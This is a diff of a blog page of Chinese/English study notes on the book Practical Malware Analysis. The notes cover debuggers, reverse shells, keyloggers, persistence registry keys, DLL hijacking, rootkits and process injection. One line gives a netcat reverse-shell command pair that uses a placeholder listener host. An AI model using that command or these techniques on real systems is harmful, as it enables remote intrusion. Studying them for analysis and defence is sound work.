@@ -5,7 +5,8 @@
   
   
   <meta name="description" content="Practical Malware Analysis The Hands-On Guide to Dissecting Malicious Software
-恶意代码分析实战期末复习笔记 by757" />
+恶意代码分析实战期末复习笔记 by757
+书籍：Practical Malware Analysis" />
   
 
   
@@ -16,15 +17,16 @@
   
   <title>恶意代码分析实战笔记 | QiShengjia</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="Practical Malware Analysis The Hands-On Guide to Dissecting Malicious Software 恶意代码分析实战期末复习笔记 by757">
+  <meta name="description" content="Practical Malware Analysis The Hands-On Guide to Dissecting Malicious Software 恶意代码分析实战期末复习笔记 by757 书籍：Practical Malware Analysis">
 <meta property="og:type" content="article">
 <meta property="og:title" content="恶意代码分析实战笔记">
 <meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2019&#x2F;12&#x2F;26&#x2F;%E6%81%B6%E6%84%8F%E4%BB%A3%E7%A0%81%E5%88%86%E6%9E%90%E5%AE%9E%E6%88%98%E7%AC%94%E8%AE%B0&#x2F;index.html">
 <meta property="og:site_name" content="QiShengjia">
-<meta property="og:description" content="Practical Malware Analysis The Hands-On Guide to Dissecting Malicious Software 恶意代码分析实战期末复习笔记 by757">
+<meta property="og:description" content="Practical Malware Analysis The Hands-On Guide to Dissecting Malicious Software 恶意代码分析实战期末复习笔记 by757 书籍：Practical Malware Analysis">
 <meta property="og:locale" content="zh-CN">
 <meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;flame7wq&#x2F;MarkdownPic&#x2F;master&#x2F;Image.png">
-<meta property="og:updated_time" content="2019-12-27T01:22:30.316Z">
+<meta property="og:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;flame7wq&#x2F;MarkdownPic&#x2F;master&#x2F;Image%20%5B2%5D.png">
+<meta property="og:updated_time" content="2019-12-31T08:15:06.370Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https:&#x2F;&#x2F;raw.githubusercontent.com&#x2F;flame7wq&#x2F;MarkdownPic&#x2F;master&#x2F;Image.png">
   
@@ -91,7 +93,9 @@
       
         <p>Practical Malware Analysis The Hands-On Guide to Dissecting Malicious Software</p>
 <p>恶意代码分析实战期末复习笔记 by757</p>
+<p>书籍：Practical Malware Analysis </p>
 <a id="more"></a>
+<p>链接：<a href="https://pan.baidu.com/s/1xt2WF3rImVN7VB1P04uApg" target="_blank" rel="noopener">https://pan.baidu.com/s/1xt2WF3rImVN7VB1P04uApg</a><br>提取码：4632</p>
 <h1 id="Chapter-0-入门"><a href="#Chapter-0-入门" class="headerlink" title="Chapter 0 入门"></a>Chapter 0 入门</h1><h2 id="恶意代码分析目标"><a href="#恶意代码分析目标" class="headerlink" title="恶意代码分析目标"></a>恶意代码分析目标</h2><p>&emsp;&emsp;定位感染的主机和文件，确定可疑二进制程序做了什么，如何在网络上检测，如何消除带来的损害。之后编写检测特征码来检测出网络中被感染的主机。</p>
 <ul>
 <li>基于主机的检测特征码 Host-based signatures<ul>
@@ -1033,7 +1037,134 @@ C:\&gt;rundll32.exe xyzzy.dll, #5</code><br><em>The Export value must be a funct
 <li>Debuggers can be used to change program execution.</li>
 <li>You can change the control flags, the instruction pointer, or the code itself to modify the way that a program executes</li>
 </ul>
-<h1 id="To-be-continued！"><a href="#To-be-continued！" class="headerlink" title="To be continued！"></a>To be continued！</h1>
+<h1 id="Chapter9-OllyDbg"><a href="#Chapter9-OllyDbg" class="headerlink" title="Chapter9 OllyDbg"></a>Chapter9 OllyDbg</h1><p>&emsp;&emsp;This chapter focuses on OllyDbg, an x86 debugger developed by Oleh Yuschuk. OllyDbg provides the ability to analyze malware while it is running. OllyDbg is commonly used by malware analysts and reverse engineers because it’s free, it’s easy to use, and it has many plug-ins that extend its capabilities.<br>&emsp;&emsp;There are several ways to begin debugging malware with OllyDbg. You can load executables and even DLLs directly. If malware is already running on your system, you can attach to the process and debug that way. OllyDbg provides a flexible system to run malware with command-line options or to execute specific functionality within a DLL.</p>
+<h2 id="基地址重定位"><a href="#基地址重定位" class="headerlink" title="基地址重定位"></a>基地址重定位</h2><p>&emsp;&emsp;The memory map can help you understand how a PE file is rebased during runtime. Rebasing is what happens when a module in Windows is not loaded at its preferred base address.<br><strong>Base Addresses</strong><br>&emsp;&emsp;All PE files in Windows have a preferred base address, known as the image base defined in the PE header.<br>&emsp;&emsp;Most executables are designed to be loaded at <em>0x00400000</em>, which is just the default address used by many compilers for the Windows platform.Relocation of DLLs is much more common.<br>&emsp;&emsp;Relocation is necessary because a single application may import many DLLs, each with a preferred base address in memory where they would like to be loaded. If two DLLs are loaded, and they both have the preferred load address of <em>0x10000000</em>, they can’t both be loaded there. Instead, Windows will load one of the DLLs at that address, and then relocate the other DLL somewhere else.<br>&emsp;&emsp;Most DLLs that are shipped with the Windows OS have different preferred base addresses and won’t collide. However, third-party applications often have the same preferred base address.</p>
+<p><strong>Absolute vs. Relative Addresses</strong><br>&emsp;&emsp;Most DLLs will come packaged with a list of these fix-up locations in the .reloc section of the PE header.<br>&emsp;&emsp;重定位后绝对地址需要被修改，修订规则及信息存在.reloc中。<br>&emsp;&emsp;DLLs are loaded after the .exe and in any order. This means you cannot generally predict where DLLs will be located in memory if they are rebased. DLLs can have their relocation sections removed, and if a DLL lacking a relocation section cannot be loaded at its preferred base address, then it cannot be loaded.</p>
+<h2 id="断点"><a href="#断点" class="headerlink" title="断点"></a>断点</h2><p>&emsp;&emsp;By default, OD uses software breakpoints, but you can also use hardware breakpoints. Additionally, you can set conditional breakpoints, as well as set breakpoints on memory.</p>
+<h1 id="Chapter10-KERNEL-DEBUGGING-WITH-WINDBG"><a href="#Chapter10-KERNEL-DEBUGGING-WITH-WINDBG" class="headerlink" title="Chapter10 KERNEL DEBUGGING WITH WINDBG"></a>Chapter10 KERNEL DEBUGGING WITH WINDBG</h1><p>不作考虑，仅供参考阅读。</p>
+<h1 id="Chapter11-MALWARE-BEHAVIOR"><a href="#Chapter11-MALWARE-BEHAVIOR" class="headerlink" title="Chapter11 MALWARE BEHAVIOR"></a>Chapter11 MALWARE BEHAVIOR</h1><h2 id="下载器和启动器-Downloaders-and-Launchers"><a href="#下载器和启动器-Downloaders-and-Launchers" class="headerlink" title="下载器和启动器 Downloaders and Launchers"></a>下载器和启动器 Downloaders and Launchers</h2><p>&emsp;&emsp;Downloaders simply download another piece of malware from the Internet and execute it on the local system. Downloaders are often packaged with 232 Chapter 11 an exploit. Downloaders commonly use the Windows API <em>URLDownloadtoFileA</em>, followed by a call to <em>WinExec</em> to download and execute new malware.<br>&emsp;&emsp;A launcher (also known as a loader) is any executable that installs malware for immediate or future covert execution. Launchers often contain the malware that they are designed to load.</p>
+<h2 id="后门-Backdoors"><a href="#后门-Backdoors" class="headerlink" title="后门 Backdoors"></a>后门 Backdoors</h2><p>&emsp;&emsp;A backdoor is a type of malware that provides an attacker with <strong>remote access</strong> to a victim’s machine. When using a backdoor attackers typically don’t need to download additional malware or code.<br>&emsp;&emsp;Backdoors come with a common set of functionality, such as the ability to manipulate registry keys, enumerate display windows, create directories, search files, and so on. You can determine which of these features is implemented by a backdoor by looking at the Windows functions it uses and imports.</p>
+<h3 id="Reverse-Shell"><a href="#Reverse-Shell" class="headerlink" title="Reverse Shell"></a>Reverse Shell</h3><p>&emsp;&emsp;A reverse shell is a connection that originates from an infected machine and provides attackers shell access to that machine. Reverse shells are found as both stand-alone malware and as components of more sophisticated backdoors.<br>&emsp;&emsp;在反向shell中，攻击者能够如同在本地系统上一样运行命令。</p>
+<p><strong>Netcat Reverse Shells</strong><br>remote machine：<code>nc -l –p 80</code><br>victim machine：<code>nc listener_ip 80 -e cmd.exe</code></p>
+<p><strong>Windows Reverse Shells</strong><br>Attackers employ two simple malware coding implementations for reverse shells on Windows using cmd.exe: </p>
+<ol>
+<li>基础方法<ul>
+<li>involves a call to CreateProcess</li>
+<li>manipulation of the STARTUPINFO structure that is passed to CreateProcess</li>
+</ul>
+</li>
+<li>多线程技术<ul>
+<li>involves the creation of a socket, two pipes, and two threads (so look for API calls to CreateThread and CreatePipe).</li>
+</ul>
+</li>
+</ol>
+<p><strong>远控工具 RATs</strong><br>&emsp;&emsp;RAT communication is typically over common ports like 80 and 443.</p>
+<blockquote>
+<p><a href="http://www.poisonivy-rat.com/" target="_blank" rel="noopener">Poison Ivy</a> is a freely available and popular RAT. Its functionality is controlled by shellcode plug-ins, which makes it extensible. Poison Ivy can be a useful tool for quickly generating malware samples to test or analyze.</p>
+</blockquote>
+<p><strong>BotNets</strong><br>&emsp;&emsp;A botnet is a collection of compromised hosts, known as zombies, that are controlled by a single entity, usually through the use of a server known as a botnet controller.<br>Goals:</p>
+<ul>
+<li>compromise as many hosts as possible</li>
+<li>create a large network of zombies</li>
+<li>spread additional malware or spam</li>
+<li>perform a distributed denial-of-service (DDoS) attack</li>
+</ul>
+<p><strong>RATs and Botnets Compared</strong></p>
+<ul>
+<li>僵尸网络控制的主机数量更多。</li>
+<li>僵尸网络中的所有主机在同一时刻被控制，远控则以受害者为单位进行控制，因为远控要求更紧密的交互</li>
+<li>僵尸网络用来进行大规模攻击，而远控则是针对性攻击</li>
+</ul>
+<h3 id="登录凭证窃密器-Credential-Stealers"><a href="#登录凭证窃密器-Credential-Stealers" class="headerlink" title="登录凭证窃密器 Credential Stealers"></a>登录凭证窃密器 Credential Stealers</h3><p>&emsp;&emsp;Attackers often go to great lengths to steal credentials, primarily with three types of malware:</p>
+<ul>
+<li>Programs that wait for a user to log in in order to steal their credentials</li>
+<li>Programs that dump information stored in Windows, such as password hashes, to be used directly or cracked offline</li>
+<li>Programs that log keystrokes</li>
+</ul>
+<p><strong>GINA拦截GINA Interception</strong><br>&emsp;&emsp;Microsoft’s Graphical Identification and Authentication (GINA) interception is a technique that malware uses to steal user credentials.</p>
+<p><strong>口令哈希转储 Hash Dumping</strong><br>&emsp;&emsp;Attackers try to grab these hashes in order to crack them offline or to use them in a pass-the-hash attack. A pass-the-hash attack uses LM and NTLM hashes to authenticate to a remote host (using NTLM authentication) without needing to decrypt or crack the hashes to obtain the plaintext password to log in.</p>
+<p><strong>击键记录Keystroke Logging</strong></p>
+<ol>
+<li>Kernel-Based Keyloggers<ul>
+<li>用户模式下的程序难以检测，他们常作为Rootkit的一部分并且作为一个键盘驱动绕过用户空间应用程序和保护，来捕获击键操作。</li>
+</ul>
+</li>
+<li>User-Space Keyloggers<br>Windows user-space keyloggers typically use the Windows API and are usually implemented with <ul>
+<li>hooking、SetWindowsHookEx function<ul>
+<li>This type of keylogger may come packaged as an executable that initiates the hook function, and may include a DLL file to handle logging that can be mapped into many processes on the system automatically.</li>
+</ul>
+</li>
+<li>polling、GetAsyncKeyState and GetForegroundWindow functions<ul>
+<li>The GetAsyncKeyState function identifies whether a key is pressed or depressed, and whether the key was pressed after the most recent call to GetAsyncKeyState.</li>
+<li>The GetForegroundWindow function identifies the foreground window—the one that has focus—which tells the keylogger which application is being used for keyboard entry (Notepad or Internet Explorer, for example).<br><img src="https://raw.githubusercontent.com/flame7wq/MarkdownPic/master/Image%20%5B2%5D.png" alt="663b54dc9b93454c92ee84863afa74a9.png"></li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<h2 id="存活机制-Persistence-Mechanisms"><a href="#存活机制-Persistence-Mechanisms" class="headerlink" title="存活机制 Persistence Mechanisms"></a>存活机制 Persistence Mechanisms</h2><p>&emsp;&emsp;Once malware gains access to a system, it often looks to be there for a long time. This behavior is known as persistence.</p>
+<ol>
+<li>Modification of the system’s registry<ul>
+<li>Applnit_DLL<ul>
+<li>Applnit_DLL中的DLL程序会在进程加载User32.dll时被加载，所以恶意代码作者可以将DLL路径插入到注册表Applnit_DLL</li>
+<li>Applnit_DLL存储在 <code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows</code></li>
+</ul>
+</li>
+<li>Winlogon Notity<ul>
+<li>Malware authors can hook malware to a particular Winlogon event, such as logon, logoff, startup, shutdown, and lock screen.</li>
+<li>Notify value：<code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\</code></li>
+<li>When winlogon.exe generates an event, Windows checks the Notify registry key for a DLL that will handle it.</li>
+</ul>
+</li>
+<li>SvcHost DLL<ul>
+<li>Svchost.exe is a generic host process for services that run from DLLs, and Windows systems often have many instances of svchost.exe running at once.</li>
+<li><code>HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Svchost</code></li>
+<li>服务的注册表位置：<code>HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\ServiceName</code></li>
+</ul>
+</li>
+</ul>
+</li>
+<li>DLL load-order hijacking<ul>
+<li>DLL加载顺序劫持是一种简单隐蔽的技术。</li>
+<li>正常的DLL默认加载搜索顺序<ol>
+<li>The directory from which the application loaded</li>
+<li>The current directory    </li>
+<li>The system directory (the GetSystemDirectory function is used to get the path, such as …/Windows/System32/) </li>
+<li>The 16-bit system directory (such as …/Windows/System/)    </li>
+<li>The Windows directory (the GetWindowsDirectory function is used to get the path, such as …/Windows/)    </li>
+<li>The directories listed in the PATH environment variable   </li>
+</ol>
+</li>
+<li>/Windows目录会在/system32之前被搜索，将恶意代码改名为即将在/system32被调用的dll名存放在/Windows目录下，则合法加载成功，为了让系统运行，恶意DLL程序随后再加载真正的DLL。</li>
+</ul>
+</li>
+<li>特洛伊木马化系统二进制文件 Trojanized System Binaries<ul>
+<li>恶意代码通常修改一个系统文件的函数入口点，使它跳转到恶意代码。为了不影响二进制文件的正常操作，恶意代码常被加入到可执行文件的一个空节中。</li>
+</ul>
+</li>
+</ol>
+<h2 id="提权-Privilege-Escalation"><a href="#提权-Privilege-Escalation" class="headerlink" title="提权 Privilege Escalation"></a>提权 Privilege Escalation</h2><p>&emsp;&emsp;The majority of privilege-escalation attacks are known exploits or zero-day attacks against the local OS, many of which can be found in the <a href="http://www.metasploit.com/" target="_blank" rel="noopener">Metasploit Framework</a></p>
+<h2 id="Covering-Its-Tracks—User-Mode-Rootkits"><a href="#Covering-Its-Tracks—User-Mode-Rootkits" class="headerlink" title="Covering Its Tracks—User-Mode Rootkits"></a>Covering Its Tracks—User-Mode Rootkits</h2><p>&emsp;&emsp;rootkit是常用来隐藏恶意代码行为的工具。大部分rootkit通过修改操作系统内部功能来实现。<br>&emsp;&emsp;两种经典rootkit方法：</p>
+<ol>
+<li>IAT Hook，修改导入表（IAT）或导出表（EAT）来隐藏本地文件、进程以及网络连接。</li>
+<li>Inline Hook，覆盖导入DLL中API的函数代码。</li>
+</ol>
+<p>&emsp;&emsp;IAT Hook只简单地修改函数指针，Inline Hook将修改实际的函数代码</p>
+<h1 id="Chapter12-COVERT-MALWARE-LAUNCHING"><a href="#Chapter12-COVERT-MALWARE-LAUNCHING" class="headerlink" title="Chapter12 COVERT MALWARE LAUNCHING"></a>Chapter12 COVERT MALWARE LAUNCHING</h1><p>&emsp;&emsp;As computer systems and users have become more sophisticated, malware, too, has evolved.</p>
+<h2 id="Launchers"><a href="#Launchers" class="headerlink" title="Launchers"></a>Launchers</h2><p>&emsp;&emsp;The most common example is an executable or DLL in its own resource section.<br>&emsp;&emsp;Launchers will often store malware within the resource section. When the launcher is run, it extracts an embedded executable or DLL from the resource section before launching it.</p>
+<h2 id="Process-Injection"><a href="#Process-Injection" class="headerlink" title="Process Injection"></a>Process Injection</h2><p>&emsp;&emsp;影藏启动的最流行技术是进程注入。<br>&emsp;&emsp;常用API：</p>
+<ul>
+<li>VirtualAllocEx function can be used to allocate space in an external process’s memory</li>
+<li>WriteProcessMemory can be used to write data to that allocated space.</li>
+</ul>
+<h3 id="DLL注入"><a href="#DLL注入" class="headerlink" title="DLL注入"></a>DLL注入</h3><p>&emsp;&emsp;被防火墙限制联网的恶意DLL通过启动器恶意代码注入DLL程序到IE的进程内存空间，则DLL程序与IE一样的网络访问权限。<br>&emsp;&emsp;启动器获取恶意DLL的句柄</p>
+<ul>
+<li>The most common way is to use the Windows API calls CreateToolhelp32Snapshot, Process32First, and Process32Next to search the process list for the injection target. Once the target is found, the launcher retrieves the process identifier (PID) of the target process and then uses it to obtain the handle via a call to OpenProcess.</li>
+</ul>
+<p>&emsp;&emsp;The function <em>CreateRemoteThread</em> is commonly used for DLL injection to allow the launcher malware to create and execute a new thread in a remote process.</p>
+<h3 id="直接注入"><a href="#直接注入" class="headerlink" title="直接注入"></a>直接注入</h3><h2 id="进程替换"><a href="#进程替换" class="headerlink" title="进程替换"></a>进程替换</h2><p>&emsp;&emsp;Rather than inject code into a host program, some malware uses a method known as process replacement to overwrite the memory space of a running process with a malicious executable. Process replacement is used when a malware author wants to disguise malware as a legitimate process, without the risk of crashing a process through the use of process injection.<br>&emsp;&emsp;进程替换的关键是以挂起状态创建一个线程。<br>&emsp;&emsp;Process replacement is an effective way for malware to appear nonmalicious. By masquerading as the victim process, the malware is able to bypass firewalls or intrusion prevention systems (IPSs) and avoid detection by appearing to be a normal Windows process. Also, by using the original binary’s path, the malware deceives the savvy user who, when viewing a process listing, sees only the known and valid binary executing, with no idea that it was unmapped.</p>
+<h2 id="钩子注入"><a href="#钩子注入" class="headerlink" title="钩子注入"></a>钩子注入</h2><h2 id="Detours"><a href="#Detours" class="headerlink" title="Detours"></a>Detours</h2><p>&emsp;&emsp;Detours is a library developed by Microsoft Research in 1999. It was originally intended as a way to easily instrument and extend existing OS and application functionality. The Detours library makes it possible for a developer to make application modifications simply.<br>&emsp;&emsp;在二进制文件中添加新的段，并修改PE头。</p>
+<h2 id="APC注入"><a href="#APC注入" class="headerlink" title="APC注入"></a>APC注入</h2><h1 id="Chapter13-DATA-ENCODING"><a href="#Chapter13-DATA-ENCODING" class="headerlink" title="Chapter13 DATA ENCODING"></a>Chapter13 DATA ENCODING</h1><h1 id="Chapter14-MALWARE-FOCUSED-NETWORK-SIGNATURES"><a href="#Chapter14-MALWARE-FOCUSED-NETWORK-SIGNATURES" class="headerlink" title="Chapter14 MALWARE-FOCUSED NETWORK SIGNATURES"></a>Chapter14 MALWARE-FOCUSED NETWORK SIGNATURES</h1><h1 id="To-be-continued！"><a href="#To-be-continued！" class="headerlink" title="To be continued！"></a>To be continued！</h1>
       
     </div><!-- .entry-content -->
 
